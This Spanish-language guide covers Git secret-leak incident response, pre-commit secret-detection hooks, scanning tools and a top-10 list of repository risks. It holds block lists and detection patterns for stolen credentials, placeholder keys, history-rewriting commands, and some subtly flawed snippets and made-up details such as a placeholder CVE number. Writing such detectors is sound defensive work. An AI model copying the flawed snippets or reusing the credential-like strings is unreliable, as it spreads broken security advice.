**PASO 2: AUDITORÍA DE ACCESO DURANTE EXPOSICIÓN (T+10 a T+30 min)**

```bash
# ¿Quién accedió durante la ventana de exposición?

# GitHub Personal Token Scope:
# Token = repo + read:user
# Ventana: desde el commit hasta que fue deletado

# Qué verificar:
git log --since="2026-02-14 10:00" --until="2026-02-14 10:45"
# ¿Hay commits sospechosos?

git log -p --since="2026-02-14 10:00" |  grep -i "delete\|drop\|truncate"
# ¿Alguien borró datos durante la ventana?

# AWS Access Key:
# CloudTrail registra todas las acciones con una key

aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE \
  --start-time 2026-02-14T10:00:00Z \
  --end-time 2026-02-14T10:45:00Z

# Ejemplo de CloudTrail output:
# {
#   "Events": [
#     {
#       "EventTime": "2026-02-14T10:15:30Z",
#       "EventName": "DescribeInstances",
#       "SourceIPAddress": "203.0.113.42",  # ¿IP conocida?
#       "UserAgent": "aws-cli/2.0.0"
#     },
#     {
#       "EventTime": "2026-02-14T10:16:45Z",
#       "EventName": "GetObject",
#       "RequestParameters": {"bucketName": "production-backups"},
#       "SourceIPAddress": "203.0.113.42"
#     }
#   ]
# }

# Análisis:
# - ¿IP 203.0.113.42 es interna (conocida)?
# - ¿Acceso a instancias/datos sensibles?
# - ¿Modificaciones o solo lecturas?
```

**PASO 3: LIMPIAR HISTORIO DE GIT (T+30 min)**

```bash
# Usar BFG para limpiar el secreto del historio

# Crear archivo de secretos a reemplazar
cat > secrets-to-clean.txt << 'EOF'
AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE123456
database_password=P@ssw0rd123
github_token=ghp_abcdefghijklmnopqrstuvwxyz
EOF

# Ejecutar BFG
bfg --replace-text secrets-to-clean.txt

# Resultado: Todos los commits que contenían estos secretos son reescritos
# Los secretos son reemplazados con "***REDACTED***"

# Push cambios (nota: force-with-lease es más seguro que force)
git push origin --force-with-lease

# Verificar limpieza
git log -p | grep -i "AKIAIOSFODNN7EXAMPLE"
# Should return: (nothing)

# ✓ Secreto removido del historio público
# Pero nota: Reflog local aún lo tiene 30 días
git reflog expire --expire=now --all
git gc --prune=now --aggressive
```

**PASO 4: REGENERAR CREDENCIAL (T+30 a T+60 min)**

```bash
# Tipo 1: GitHub Personal Access Token

# GitHub Settings > Developer settings > Personal access tokens > Generate new token
# Nombre: "Personal Token - Feb 2026 (post-rotation)"
# Scopes: [repo, read:user]  # Solo necesarios

# Resultado: Nuevo token emitido
# Ej: ghp_NewTokenAfterCompromise123456789abc

# Actualizar en máquina local:
git config --global github.token "ghp_NewTokenAfterCompromise123456789abc"

# O si usas SSH (mejor):
# Generar nuevo SSH key (ver sección SSH Key Rotation)
ssh-keygen -t ed25519 -C "post-rotation-key"

# Probar:
git clone https://github.com/user/repo.git  # Debe funcionar sin errores

# ✓ Nuevo token funcional
```

```bash
# Tipo 2: AWS Access Key

# AWS Console > IAM > Users > [User] > Create access key
# New access key ID y secret emitidos

# IMPORTANTE: Copiar AHORA (only shown once)
# Si no copias: tendrás que crear uno nuevo

# Actualizar en máquina:
aws configure
# AWS Access Key ID: AKIANEWKEYID12345678
# AWS Secret Access Key: x0y0Z0NewSecretKey/+9876543210abcdef

# O actualizar archivo directamente:
cat > ~/.aws/credentials << EOF
[default]
aws_access_key_id = AKIANEWKEYID12345678
aws_secret_access_key = x0y0Z0NewSecretKey/+9876543210abcdef
EOF

# Probar:
aws sts get-caller-identity
# Debe retornar información de la cuenta

# ✓ Nueva key funcional
```

**PASO 5: ACTUALIZAR EN SISTEMAS CI/CD (T+60 min)**

```bash
# GitHub Actions: Actualizar secrets

# GitHub > Settings > Secrets and variables > Actions > Update secret
# AWS_ACCESS_KEY_ID: [nuevo valor]
# AWS_SECRET_ACCESS_KEY: [nuevo valor]

# O via CLI:
gh secret set AWS_ACCESS_KEY_ID --body "AKIANEWKEYID12345678"
gh secret set AWS_SECRET_ACCESS_KEY --body "x0y0Z0NewSecretKey/+9876543210abcdef"

# Probar: Hacer commit para dispara una GitHub Action
git commit --allow-empty -m "test: Verify new AWS credentials in CI"
git push

# GitHub Actions ejecuta y usa nuevos credentials
# Mira logs para confirmación exitosa

# ✓ CI/CD usa nuevas credenciales
```

```bash
# Si usas otras plataformas:

# GitLab CI/CD:
# Settings > CI/CD > Variables > Edit
# AWS_ACCESS_KEY_ID: [actualizar]

# Jenkins:
# Credentials > System > Global credentials > Edit credential

# Cada plataforma tiene su tablero de secretos
```

**PASO 6: AUDITORÍA Y COMUNICACIÓN (T+2 a T+8 horas)**

```bash
# Crear documento de incidente

cat > SECURITY_INCIDENT_2026_02_14.md << 'EOF'
# Security Incident Report: Exposed AWS Credentials

## Timeline
- **T=0 (10:00 AM)**: Credential commit pushed to main
- **T=15m (10:15 AM)**: Detected during code review
- **T=20m (10:20 AM)**: AWS key revoked (deactivated)
- **T=30m (10:30 AM)**: Git history cleaned with BFG
- **T=45m (10:45 AM)**: New AWS key generated
- **T=90m (11:30 AM)**: All systems updated with new credentials

## Root Cause Analysis
- Developer did not use `.env` file from `.gitignore`
- `.gitignore` was misconfigured (commented out `.env` accidentally)
- No pre-commit hook to detect secrets
- No secret scanning enabled on GitHub

## Impact Assessment
- CloudTrail shows: No unauthorized AWS API calls during 10:15-10:30 exposure window
- Conclusion: No data loss or unauthorized access detected ✓

## Remediation Actions Taken
1. ✓ Immediate revocation of compromised key
2. ✓ Git history cleaned
3. ✓ New credentials generated and rotated to all systems
4. ✓ Post-incident CloudTrail audit conducted
5. ✓ No evidence of malicious activity

## Preventive Measures (Going Forward)
1. Enable GitHub Advanced Security > Secret scanning
2. Configure pre-commit hook with truffleHog/detect-secrets
3. Review and fix `.gitignore` (reenable .env exclusion)
4. Conduct team training on secret management
5. Implement credential rotation schedule (90-day cycle)
6. Enable branch protection with signed commits requirement

## Lessons Learned
- `.gitignore` misconfiguration was human error point
- GitHub's secret detection could have prevented this (enable it now)
- Pre-commit hooks are essential for development workflow

EOF

# Compartir con team
git add SECURITY_INCIDENT_2026_02_14.md
git commit -S -m "docs: Security incident post-mortem and remediation"
git push

# Notificar al equipo
# Email/Slack: "Security incident on 2026-02-14: AWS credentials exposed.
#              Incident documented in repo. Review and complete training by EOD."
```

**PASO 7: IMPLEMENTAR PREVENCIONES (T+24 horas)**

```bash
# Pre-commit Hook para Detectar Secretos

cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
# Prevent commits containing secrets

# Install: cp .git/hooks/pre-commit /repo && chmod +x

# Patterns de secretos comunes
PATTERNS_TO_CHECK=(
    "password\s*=\|password\s*:\|password\s*\""
    "api[_-]?key"
    "AWS_SECRET"
    "PRIVATE[_-]KEY"
    "token\s*="
    "secret\s*="
)

for pattern in "${PATTERNS_TO_CHECK[@]}"; do
    if git diff --cached | grep -iPE "$pattern" | grep -v ".env.example"; then
        echo "❌ Possible secret detected in commit!"
        echo "   Pattern: $pattern"
        echo "   Please remove before committing"
        exit 1
    fi
done

# Use detect-secrets más potent (install: pip install detect-secrets)
if command -v detect-secrets &> /dev/null; then
    detect-secrets scan --baseline .secrets.baseline --all-files
fi

exit 0
EOF

chmod +x .git/hooks/pre-commit

# GitHub Secret Scanning
# GitHub > Settings > Security & analysis >
# Enable: Secret scanning
# Enable: Push protection (bloquea push si detecta secreto)

# Agregar al repo
git add .git/hooks/pre-commit
git commit -S -m "security: Add pre-commit secret detection hook"
git push
```

---

#### How do you prevent secrets in commits (pre-commit hooks)?

**Sistema de Protección en 3 Niveles**

**NIVEL 1: Pre-commit Hook (Local)**

```bash
# Archivo: .githooks/pre-commit
# Qué hace: Intercepta commit ANTES de guardarse

#!/bin/bash
set -e

echo "🔍 Running pre-commit security checks..."

# Check 1: Detectar patrones de secretos
echo "[1/3] Scanning for common secret patterns..."

BLOCKED_PATTERNS=(
    'AWS_SECRET_ACCESS_KEY\s*='
    'password\s*[=:]|password\s*"\s*:'
    'api[_-]?key\s*[=:]'
    'PRIVATE[_-]KEY'
    'github_token|github_pat_'
    'slack_webhook|slack_token'
    'stripe_[sk]k_'
    'mongodb_uri|mongodb_password'
    'database_password|db_password'
    'jwt_secret|auth_secret'
)

FOUND_SECRET=0

for pattern in "${BLOCKED_PATTERNS[@]}"; do
    if git diff --cached | grep -iE "$pattern"; then
        echo "❌ Potential secret detected: $pattern"
        FOUND_SECRET=1
    fi
done

if [ $FOUND_SECRET -eq 1 ]; then
    echo ""
    echo "ERROR: Secrets detected in staged changes!"
    echo "Please remove before committing."
    echo "Allowed: Use .env.example for templates"
    exit 1
fi

# Check 2: Detectar archivos prohibidos
echo "[2/3] Checking for prohibited files..."

PROHIBITED_FILES=(
    '.env'
    '.env.local'
    '.env.production'
    '*.pem'
    '*.key'
    'config/secrets.yml'
    'credentials.json'
)

for file_pattern in "${PROHIBITED_FILES[@]}"; do
    if git diff --cached --name-only | grep -E "$file_pattern"; then
        echo "❌ Prohibited file detected: $file_pattern"
        echo "   Add to .gitignore if needed"
        exit 1
    fi
done

# Check 3: Usar detect-secrets si está disponible
echo "[3/3] Running detect-secrets scanner..."

if command -v detect-secrets &> /dev/null; then
    # detect-secrets más potente
    detect-secrets scan --baseline .secrets.baseline --all-files
    if [ $? -ne 0 ]; then
        echo "❌ detect-secrets found issues"
        exit 1
    fi
else
    echo "⚠️  detect-secrets not installed (optional)"
    echo "Install: pip install detect-secrets"
fi

echo "✅ Pre-commit security checks passed!"
exit 0
```

**Instalación y Activación**:

```bash
# Opción 1: Manual (en cada clone)
cp .githooks/pre-commit .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit

# Opción 2: Automático (vía setup script)
# En repo: scripts/setup-git-hooks.sh

#!/bin/bash
# Setup Git hooks for all developers

mkdir -p .git/hooks
for hook in .githooks/*; do
    hook_name=$(basename "$hook")
    cp "$hook" ".git/hooks/$hook_name"
    chmod +x ".git/hooks/$hook_name"
    echo "✓ Installed hook: $hook_name"
done

# Ejecutar en onboarding:
# cat README.md: "First time setup: ./scripts/setup-git-hooks.sh"

# Opción 3: Automático vía npmig Git config
git config core.hooksPath .githooks
# Git automáticamente ejecuta hooks de .githooks/

# Verificar:
git config core.hooksPath
# Output: .githooks
```

**Qué Sucede Cuando Un Secreto Es Detectado**:

```bash
# Developer intenta commitear archivo .env
$ git add .env
$ git commit -m "Add configuration"

# Output:
🔍 Running pre-commit security checks...
[1/3] Scanning for common secret patterns...
❌ Potential secret detected: password\s*[=:]
DATABASE_PASSWORD=MySecretPassword123

ERROR: Secrets detected in staged changes!
Please remove before committing.
Allowed: Use .env.example for templates

# Commit BLOQUEADO
$ echo $?
1  # Exit code 1 = falló


# Developer debe arreglarlo:
$ git rm .env  # Remover del staging
# O si quiso commitear .env.example (sin secretos)
$ mv .env .env.example
$ # Editar .env.example para remover valores reales
# Agregar a .gitignore:
$ echo ".env" >> .gitignore

$ git add .env.example .gitignore
$ git commit -m "Add env template"

# Output:
🔍 Running pre-commit security checks...
[1/3] Scanning for common secret patterns...
[2/3] Checking for prohibited files...
[3/3] Running detect-secrets scanner...
✅ Pre-commit security checks passed!
[main abc1234] Add env template
 2 files changed, 3 insertions(+), 1 deletion(-)
```

---

**NIVEL 2: Herramienta Dedicated: detect-secrets**

```bash
# Instalación
pip install detect-secrets
# o
brew install detect-secrets

# Inicializar baseline (scanner conoce qué está permitido)
detect-secrets scan > .secrets.baseline
# Archivo .secrets.baseline registra: "estos secretos son falsos/ejemplos"

# Ejemplo .secrets.baseline:
{
  "version": "1.1.0",
  "plugins_used": [
    {
      "name": "ArtifactoryDetector"
    },
    {
      "name": "AWSKeyDetector"
    },
    {
      "name": "PrivateKeyDetector"
    }
  ],
  "results": {},  # Vacío si no hay secretos
  "generated_at": "2026-02-14T15:00:00Z"
}

# Ejecutar scan en todo el repo
detect-secrets scan --baseline .secrets.baseline --all-files

# Limpiar secretos falsamente detectados (whitelist)
detect-secrets scan --baseline .secrets.baseline --all-files

# Pre-commit hook con detect-secrets
detect-secrets-hook --baseline .secrets.baseline

# Auditar secrets en historio
detect-secrets scan --all-files | jq '.results | keys[]'
# Lista archivos con secretos potenciales

# Remover falsos positivos
echo "file.js:fake-api-key-this-is-safe-test" >> .secrets.baseline
```

---

**NIVEL 3: GitHub Secret Scanning & Push Protection**

```bash
# GitHub Settings > Security & analysis > Secret scanning
# Habilitar: "Secret scanning"

# Qué hace:
# - GitHub escanea automáticamente todos los commits
# - Detecta AWS keys, GitHub tokens, Stripe keys, etc.
# - Alerta a admin si detecta

# Mejor: Habilitar "Push protection"
#GitHub Settings > Security & analysis > Secret scanning >
# Enable "Push protection"

# Qué hace Push protection:
# - Bloquea push si detecta un secreto ANTES de que llegue a repo
# - El push es rechazado localmente por git hook (vía API)

# Developer intentaría hacer push com secreto:
$ git push origin main
remote: error: GH013: Repository rule violations found for refs/heads/main
remote:
remote: - Secrets have been found in your changes
remote:
remote: Found 1 violation:
remote:
remote:   Stripe Key (private) in file: config/stripe.js:
remote:   sk_live_51234567890abcdefghijklmnop
remote:
remote: Review GitHub's documentation:
remote: https://docs.github.com/en/code-security/secret-scanning/protecting-pushes-with-secret-scanning
remote:
remote: This push is blocked and no files were uploaded to the remote.
error: failed to push some refs to 'github.com:user/repo.git'
```

---

#### What tools help detect secrets in repositories?

**Arsenal de Herramientas de Detección de Secretos**

**1. detect-secrets (Python) - MEJOR PARA PRE-COMMIT**

```bash
# Instalación
pip install detect-secrets

# Uso básico
detect-secrets scan

# Salida:
{
  "results": {
    ".env": [
      {
        "type": "Basic Auth Credentials",
        "line_number": 5,
        "hashed_secret": "abc123def456"
      }
    ]
  }
}

# Crear baseline (whitelist de secretos conocidos)
detect-secrets scan > .secrets.baseline

# Usar en pre-commit hook
detect-secrets-hook --baseline .secrets.baseline

# Ventajas:
✓ Específico para diferentes tipos de secretos
✓ Ignora falsos positivos (baseline)
✓ Plugin system para agregar detectores personalizados
✓ Se integra fácilmente en CI/CD

# Limitaciones:
✗ Solo detecta patrones conocidos
✗ Requiere instalación (no built-in de Git)
```

---

**2. truffleHog (Go) - MEJOR PARA HISTORIO**

```bash
# Instalación
brew install truffleHog  # Mac
# o https://github.com/trufflesecurity/truffleHog/releases

# Usar básico (full commit history scan)
trufflehog git https://github.com/user/repo.git

# Salida:
Found unverified result ▶ [gitlab] ▼
  Detector Type: Gitlab
  Detector Name: Gitlab
  Verified: false
  Raw result:
  {
    "token": "glpat-1a2b3c4d5e6f7g8h",
    "line": "export GITLAB_TOKEN=glpat-1a2b3c4d5e6f7g8h"
  }

# Detectar en archivo específico
trufflehog filesystem /path/to/repo

# Detectar en Docker image
trufflehog docker postgres:latest

# Ventajas:
✓ Escanea HISTORIO completo (commits antiguos)
✓ Muy rápido (escrito en Go)
✓ Detecta muchos tipos: AWS, GitHub, Stripe, Slack, etc.
✓ Verificación: chequea si el secreto es válido aún
✓ CI/CD friendly

# Limitaciones:
✗ Más falsos positivos que detect-secrets
✗ Requiere verificación manual
```

---

**3. git-secrets (Bash) - SIMPLE PERO EFECTIVO**

```bash
# Instalación
brew install git-secrets
# o: git clone https://github.com/awslabs/git-secrets.git

# Configurar para proyecto
cd /repo
git secrets --install

# Agregar patrones a buscar
git secrets --register-aws

# Scan manual
git secrets --scan

# Scan en pre-commit (automático después de --install)
git commit -m "test"
# git-secrets automáticamente revisa

# Agregar patrón personalizado
git secrets --add '.*api_key.*'

# Ventajas:
✓ Muy simple para AWS/GCP keys
✓ Minimal overhead
✓ Respaldado por AWS (original project)

# Limitaciones:
✗ Menos potente que truffleHog
✗ Requiere agregar patrones manualmente
```

---

**4. GitHub Advanced Security - Secret Scanning (BUILT-IN)**

```bash
# Habilitar en GitHub
GitHub > Settings > Security & analysis > Secret scanning

# Tipos de secretos detectados automáticamente:
- AWS Access Key ID
- AWS Secret Access Key
- Azure SAS tokens
- GitHub Personal Access Token
- Stripe API Key
- Slack Webhook Tokens
- AWS Session Token
- Slack Bot Token
... y muchos más

# Dashboard: Security tab > Secret scanning
# Muestra: todos los secretos detectados
# Permite: marcar como "false positive" o "used elsewhere"
# Notifica: automáticamente al propietario del secreto

# Push Protection Add-on (paga)
GitHub > Settings > Code security > Push protection for users

# Qué hace:
- Bloquea push si detecta secreto
- User debe remover antes de poder hacer push

# Ventajas:
✓ Automático, sin configuración
✓ Integrado en GitHub UI
✓ Notificaciones proactivesSantana

# Limitaciones:
✗ Solo detecta patrones conocidos de GitHub
✗ Requiere GitHub pro/enterprise
```

---

**5. TruffleHog en GitHub Actions (CI/CD)**

```yaml
# archivo: .github/workflows/secrets-scan.yml

name: Secret Scanning Workflow
on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: "0 2 * * *" # Daily at 2 AM

jobs:
  scan-secrets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0

      - name: Run TruffleHog
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
          extra_args: --debug

      # Alternativa: detect-secrets
      - name: Run detect-secrets
        run: |
          pip install detect-secrets
          detect-secrets scan --all-files --baseline .secrets.baseline

      - name: Check results
        if: failure()
        run: |
          echo "⚠️  Possible secrets detected!"
          echo "Please review and remove before merging."
          exit 1
```

---

**6. SAST Tools que Incluyen Secret Detection**

```bash
# OWASP Dependency Check
check-secrets / dependency-check --scan .

# Semgrep (Análisis estático)
semgrep --config=p/security-audit --config=p/secrets

# SonarQube (Escaneo profesional)
sonar-scanner \
  -Dsonar.projectKey=myproject \
  -Dsonar.sources=. \
  -Dsonar.host.url=https://sonarqube.company.com

# Snyk (Vulnerabilidades + secretos)
snyk test --severity-threshold=high
```

---

**7. Estrategia de Múltiples Herramientas (Defense in Depth)**

```bash
#!/bin/bash
# Script: comprehensive-secret-scanning.sh

echo "🔐 COMPREHENSIVE SECRET SCANNING"
echo "=================================="

# Nivel 1: Pre-commit (primera línea de defensa)
echo "[1/4] Pre-commit detection..."
detect-secrets-hook --baseline .secrets.baseline || {
  echo "❌ Secrets detected by detect-secrets"
  exit 1
}

# Nivel 2: Local git-secrets
echo "[2/4] Git-secrets scan..."
git secrets --scan || {
  echo "❌ Secrets detected by git-secrets"
  exit 1
}

# Nivel 3: TruffleHog en historio
echo "[3/4] TruffleHog scan..."
trufflehog git . --json | jq length | grep -q "^0$" || {
  echo "❌ Secrets found in history"
  exit 1
}

# Nivel 4: Archivos prohibidos
echo "[4/4] Prohibited files check..."
PROHIBITED=(.env .env.local *.pem *.key credentials.json)
for pattern in "${PROHIBITED[@]}"; do
  find . -name "$pattern" -not -path "./.git/*" | grep . && {
    echo "❌ Prohibited file found: $pattern"
    exit 1
  }
done

echo "✅ All secret scans passed!"
exit 0
```

---

**Comparativa de Herramientas**:

| Herramienta            | Uso Principal       | Velocidad  | Precisión | Integración | Costo    |
| ---------------------- | ------------------- | ---------- | --------- | ----------- | -------- |
| detect-secrets         | Pre-commit          | Rápido     | Alta      | Fácil       | Gratis   |
| truffleHog             | Historio scanning   | Muy rápido | Media     | Excelente   | Gratis   |
| git-secrets            | AWS specific        | Rápido     | Muy alta  | Muy fácil   | Gratis   |
| GitHub Secret Scanning | Built-in            | N/A        | Normal    | Automática  | Pago     |
| Semgrep                | SAST + secrets      | Lento      | Alta      | CI/CD       | Freemium |
| SonarQube              | Enterprise scanning | Medio      | Muy alta  | Excelente   | Pago     |

---

### 🔐 Security Audit

#### What are the top security risks in Git repositories?

**Top 10 Riesgos de Seguridad en Repositorios Git**

**🔴 Riesgo #1: Secretos Expuestos en Historio**

```bash
# Problema: Secretos (API keys, passwords) commiteados por error
$ git log -p | grep -i "password\|api_key\|secret"
# Resultado: AWS keys, tokens encontrados en historio

# Impacto:
- Acceso no autorizado a servicios (AWS, Stripe, GitHub, etc.)
- Robo de datos (lecturas SQL databases)
- Exfiltración de información sensible

# Mitigación:
1. Pre-commit hooks (detect-secrets, truffleHog)
2. GitHub secret scanning + push protection
3. Auditoría periódica de historio
4. Rotación de credenciales (90 días)
5. .gitignore estricto (never commit .env, *.key)
```

**Riesgo Específico - Ejemplo Real**:

```bash
# Commit mal: 2023-05-15
git show a1b2c3d:config/database.yml
# password: "RealPassword123"
# host: "prod-db.internal.com"

# Impacto:
# Hace 200+ días, cualquiera que clonó repo tiene la password
# Repositorio público en GitHub → scanner bot lo tiene
# La password sigue siendo VÁLIDA hasta que se rote

# Remediación:
1. ✓ Limpiar historio: git filter-repo --path config/database.yml --invert-paths
2. ✓ Rotar password: ALTER USER 'prodapp' PASSWORD 'NewPassword456';
3. ✓ Auditar acceso: ¿Quién usó credenciales mientras were exposed?
4. ✓ Comunicar: Team lee security advisory
```

---

**🔴 Riesgo #2: Acceso no Autorizado via Ramas Desprotegidas**

```bash
# Problema
# main branch sin protección
# Cualquiera hace: git push origin main
# Código malicioso en producción sin revisión

# Impacto:
- Inyección de malware
- Pérdida de datos (DELETE queries)
- Parada de servicio (broken code)
- Cumplimiento: violación de SOC 2, ISO 27001

# Mitigación:
1. Branch protection en main, develop, release/*
2. Require PR antes de merge
3. Require approvals (1-3 según criticidad)
4. Status checks (tests, linting)
5. Signed commits
6. CODEOWNERS review for sensitive files
```

---

**🔴 Riesgo #3: Compromiso de Developer Credentials**

```bash
# Problema
# Developer laptop hackeada
# Attacker obtiene SSH key, GitHub token

# Ataque:
# Hacker hace: git clone usando SSH key robada
# Edita código: Agrega backdoor en login function
# Commit: git commit -S -m "feat: optimization"  # ¿Firma con GPG robada?
# Push: git push origin feature/backdoor

# Impacto:
- Si GPG key NO está encriptada: fácil falsificar firma
- Si apenas SSH key: acceso a repositorio como el developer
- PR mergeado sin revisión real (si hacker tbién puede aprobar)
- Backdoor en producción

# Mitigación:
1. GPG key con passphrase (encriptada)
2. SSH key con passphrase
3. Require 2+ approvals para merge (no auto-approve)
4. MFA on GitHub (2FA required)
5. Regular security awareness training
6. Monitoreo: actividad sospechosa (commits fuera de horario)
7. GPG key rotation: anual o si sospecha compromiso
```

**Detección de Compromiso de Credentials**:

```bash
# Señales de alerta:
git log --author="Developer Name" --since="2026-02-01" \
  --format="%h %aI %s" |
  while read -r commit; do
    AUTHOR_TIME=$(echo $commit | awk '{print $2}')
    HOUR=$(date -d "$AUTHOR_TIME" +%H)
    # Alert if commit at 3 AM (unusual)
    if [ $HOUR -ge 2 ] && [ $HOUR -le 4 ]; then
      echo "⚠️  Unusual commit time: $commit"
    fi
  done

# Review: Commits with suspicious patterns
git log --grep="optimization\|fix\|update" --oneline | head
# Si contiene funcionalidad sospechosa: investigar
```

---

**🔴 Riesgo #4: Vulnerable Dependencies**

```bash
# Problema: package.json con versión vieja de librería
{
  "dependencies": {
    "express": "4.17.1",  # 3+ años atrás, vulnerabilidad conocid: CVE-2023-12345
    "lodash": "4.17.15"   # Vulnerability en version < 4.17.21
  }
}

# Impacto:
- RCE (Remote Code Execution) en servidor
- XSS (Cross-Site Scripting) en frontend
- Acceso a datos sensibles
- Cumplimiento fallido (OWASP, PCI-DSS)

# Mitigación:
1. Auditoría regular: npm audit, pip check
2. Dependabot: monitoreo automático en GitHub
3. Renovar dependencies: npm update
4. SAST scanning: Snyk, SonarQube
5. Bloquear versiones conocidas como vulnerables en CI/CD
```

**Verificación**:

```bash
npm audit
# Vulnerabilities found:

# Critical: lodash
#   Prototype Pollution in lodash <= 4.17.20
#   Fix: npm install lodash@4.17.21

# High: express
#   Prototype Pollution (req.params)
#   Fix: npm install express@4.18.2

npm audit fix --force  # Auto-update (puede romper)
npm audit fix          # Update solo patch versions
```

---

**🔴 Riesgo #5: Insider Threat (Malicious Developer)**

```bash
# Problema: Developer tiene acceso legítimo, pero intención maliciosa
# Quiere:
# 1. Robar datos
# 2. Introducir backdoor
# 3. Sabotaje

# Ataque:
# Developer esconde código malicioso en PR grande (1000+ lines)
# Revisor no lee línea por línea
# Backdoor merged a main

# Impacto:
- Acceso a datos (exfiltración)
- Compromiso de seguridad
- Cumplimiento fallido

# Mitigación:
1. Code review rigurosa (no confiar en un revisor)
2. Linters y analyzers automáticos detectan patrones sospechosos
3. Auditoría de permisos: ¿quién puede acceder a qué?
4. Segregación de duties: no todos tienen acceso a prod
5. Monitoreo: logs de quién hizo qué cambios
6. Off-boarding: revocar acceso inmediatamente al dejar
```

**Detección Automatizada**:

```bash
# Script detecta patrones sospechosos en PRs
git log --all -p | grep -E "(os\.system|subprocess|exec|eval)" | head -20
# ¿Hay código ejecutando comandos del sistema sin razón?

git log --all -p | grep -E "DELETE FROM\|DROP TABLE\|TRUNCATE" | head -10
# ¿Hay queries destructivas?

git log --all -p | grep -E "password|credentials|apikey" | grep -v "\.example" | head
# ¿Hay secretos en lugar de variables de entorno?
```

---

**🔴 Riesgo #6: Large Binary Files / Storage Abuse**

```bash
# Problema: Developer commitea archivo de 500MB
git add large-database-dump.sql
git commit -m "Add prod database for testing"
git push

# Impacto:
- Repositorio crece a 500MB+
- Clones toman minutos en lugar de segundos
- Git becomes sluggish
- Si es archivo sensible en historio: problema de seguridad
- Servidor Git corre sin espacio en disco

# Mitigación:
1. .gitignore: excluir *.sql, *.iso, *.zip, etc.
2. Pre-commit hook: rechazar archivos > 10MB
3. Git LFS (Large File Storage): para archivos grandes legítimos
4. Monitoreo: alertar si archivo > 50MB es commiteado
```

**Prevention Hook**:

```bash
# .git/hooks/pre-commit

find $(git diff --cached --name-only) -size +10M -type f | while read file; do
  echo "❌ File too large: $file ($(du -h $file | cut -f1))"
  exit 1
done
```

---

**🔴 Riesgo #7: Poor Branch Management / No History Retention**

```bash
# Problema: Branches no limpiados, historio es confusa
# git branch | wc -l
# Output: 342 branches

# feature/api-v1, feature/api-v2, feature/api-v3
# hotfix/fix-bug-2024-01, hotfix/fix-bug-2024-02
# old-release/1.0, old-release/1.1, old-release/1.2

# Impacto:
- Confusión: ¿cuál es la rama principal?
- Accesos heredados: viejas branches tienen permisos
- Auditoría difícil: no se puede rastrear cambios reales
- Seguridad: alguien pushea a rama antigua "olvidada"

# Mitigación:
1. Política de retención: borrar branches después de merge (1 mes)
2. Naming convention: feature/*, hotfix/*, release/*
3. Tagging: crear tags para releases
4. Review branches: cleanup script mensual
5. Protected branches: solo main, develop, release/*
```

---

**🔴 Riesgo #8: Commit History Tampering**

```bash
# Problema: Alguien hace force-push y reescribe historio
git reset --hard HEAD~5
git commit -m "Remove evidence of bug"
git push --force

# Lo que fue:
Commit 1: "Add user validation (vulnerable)"
Commit 2: "Fix SQL injection"
Commit 3: "Audit log"

# Lo que es ahora (reescrito):
Commit 1: "Add user validation (vulnerable removed)"
Commit 3: "Audit log" (Commit 2 desapareció)

# Impacto:
- Historio no es confiable
- Culpa/responsabilidad es incierta
- Auditoría fallida
- Cumplimiento fallido (debe haber trail de cambios)

# Mitigación:
1. Protección: bloquear force-push
2. Reflog: Git mantiene logs de todo (30 días)
3. Mirrors: clon en servidor aparte para backup
4. Audit trail: GitHub Actions registra todo
```

---

**🔴 Riesgo #9: Improper Access Control / Overprivileged Accounts**

```bash
# Problema: Muchos developers con acceso admin
# github.com/settings/organizations/[org]/members
# Members with "Owner" role: 25

# Desarrollo Intern tiene: Admin en repositorio crítico
# Contractor tiene: Owner de organización

# Impacto:
- Muchas personas pueden eliminar repositorio
- Muchas personas pueden desactivar protecciones
- Acceso no requerido "por si acaso"
- Riesgo de compromiso multiplicado

# Mitigación:
1. Least privilege: solo acceso necesario
2. Roles: Owner (2-3), Admin (5-10), Maintainer (dev team), Contributor (rest)
3. Auditar quarterly: ¿quién tiene qué acceso?
4. Offboarding: remover acceso inmediatamente
5. Time-limited access: para contractors, revoke after project
```

---

**🔴 Riesgo #10: Lack of Audit Trail / Compliance Logging**

```bash
# Problema: No se sabe quién hizo qué cambios
# git log --all | head -20
# Autor + fecha... pero en un repositorio de 500 developers,
# ¿quién es responsable?

# Impacto:
- Forensenia imposible
- Cumplimiento fallido
- No se puede rastrear cambios a código sensible
- Imposible demostrar who introduced vulnerability

# Mitigación:
1. Signed commits (GPG): verifica quién hizo commit
2. GitHub audit log: registra todo (Settings > Audit log)
3. Webhooks: envía eventos a sistema de logging centralizado
4. Commit msg requirements: "Jira-123: Description"
5. Retention policy: 7 años mínimo para auditoría

# Audit ticket example:
git log --all --format="%H %aI %an %s" --grep="JIRA-123" | head
# ab1234cd 2026-02-14T10:30:00+00:00 Fernando Cuesta feat: JIRA-123 Add user signup
```

---

#### How do you conduct a comprehensive security review?

**Proceso de Security Audit Completo para Repositorio Git**

**FASE 1: Preparación y Planificación (1 hora)**

```bash
#!/bin/bash
# Archivo: security-audit-prep.sh

echo "🔐 GIT SECURITY AUDIT - PREPARATION PHASE"
echo "=========================================="

AUDIT_DATE=$(date +%Y-%m-%d)
AUDIT_DIR="security-audits/$AUDIT_DATE"
mkdir -p "$AUDIT_DIR"

# 1. Obtener información del repositorio
echo "[1/5] Gathering repository information..."
git config --list > "$AUDIT_DIR/git-config.txt"
git branch -a > "$AUDIT_DIR/branches.txt"
git remote -v > "$AUDIT_DIR/remotes.txt"
git log --oneline | head -50 > "$AUDIT_DIR/recent-commits.txt"

# 2. Documentar protecciones actuales
echo "[2/5] Documenting current protections..."
# Manually or via GitHub API:
gh repo view --json branchProtectionRules ---template '{{range .branchProtectionRules}}{{.pattern}}: {{.requiresApprovals}}, {{.requiresCodeOwnerReviews}}{{end}}' > "$AUDIT_DIR/branch-protections.txt"

# 3. Listar contributors y acceso
echo "[3/5] Listing collaborators..."
git log --all --format="%aN" | sort | uniq -c | sort -rn > "$AUDIT_DIR/contributors.txt"
gh repo view --json collaborators --jq '.collaborators[] | "\(.name): \(.role)"' > "$AUDIT_DIR/github-collaborators.txt"

# 4. Estadísticas de commits
